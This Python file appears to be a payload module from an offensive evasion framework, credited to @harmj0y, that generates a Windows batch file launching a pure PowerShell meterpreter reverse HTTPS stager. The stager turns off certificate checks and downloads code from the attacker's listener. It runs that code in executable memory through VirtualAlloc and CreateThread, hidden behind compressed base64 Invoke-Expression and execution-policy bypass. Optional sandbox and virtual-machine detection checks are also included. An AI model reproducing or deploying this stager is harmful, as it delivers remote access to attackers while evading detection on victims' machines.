"""

Custom-written pure powershell meterpreter/reverse_https stager.

Module by @harmj0y

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "bat"
        self.name = "Pure PowerShell Reverse HTTPS Stager"
        self.path = "powershell/meterpreter/rev_https"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # optional
        self.required_options = {
            "LHOST" : ["", "IP of the Metasploit handler"],
            "LPORT" : ["8443", "Port of the Metasploit handler"],
            "PROXY" : ["N", "Use system proxy settings"],
            "STAGERURILENGTH" : ["4", "The URI length for the stager (at least 4 chars)."],
            "LURI" : ["/","The HTTP path to prepend to the listener. Ex: http://attacker:port/[LURI]"],
            "USER_AGENT" : ["Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", "The User-Agent header to send with the initial stager request"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
            "MINRAM"         : ["FALSE", "Require a minimum of 3 gigs of RAM"],
            "UTCCHECK"       : ["FALSE", "Check that system isn't using UTC time zone"],
            "VIRTUALPROC"    : ["FALSE", "Check for known VM processes"],
            "MINBROWSERS"    : ["FALSE", "Minimum of 2 browsers"],
            "BADMACS"        : ["FALSE", "Checks for known bad mac addresses"],
            "MINPROCESSES"   : ["X", "Minimum number of processes running"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]}

    def generate(self):
        checks, num_ends = gamemaker.senecas_games(self)
        proxyString = "$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;"
        baseString = """$q = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@\n"""
        baseString += checks
        baseString += """try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum %% 0x100 -eq 92)}
function t {$f = "";1..%i|foreach-object{$f+= $d[(get-random -maximum $d.Length)]};return $f;}
function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return "9vXU";}
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$m = New-Object System.Net.WebClient;%s
$m.Headers.Add("user-agent", "%s");$n = g; [Byte[]] $p = $m.DownloadData("https://%s:%s/%s$n" )
$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %((int(self.required_options["STAGERURILENGTH"][0])-1), 
                                                                              "" if self.required_options["PROXY"][0] == "N" else proxyString,
                                                                              self.required_options["USER_AGENT"][0],
                                                                              self.required_options["LHOST"][0], 
                                                                              self.required_options["LPORT"][0],
                                                                              "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])
        encoded = evasion_helpers.deflate(baseString)
        payload_code = "@echo off\n"
        payload_code += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payload_code += "powershell.exe -NoP -NonI -W Hidden -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
        payload_code += ") else ("
        payload_code += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)

        self.payload_source_code = payload_code
        return
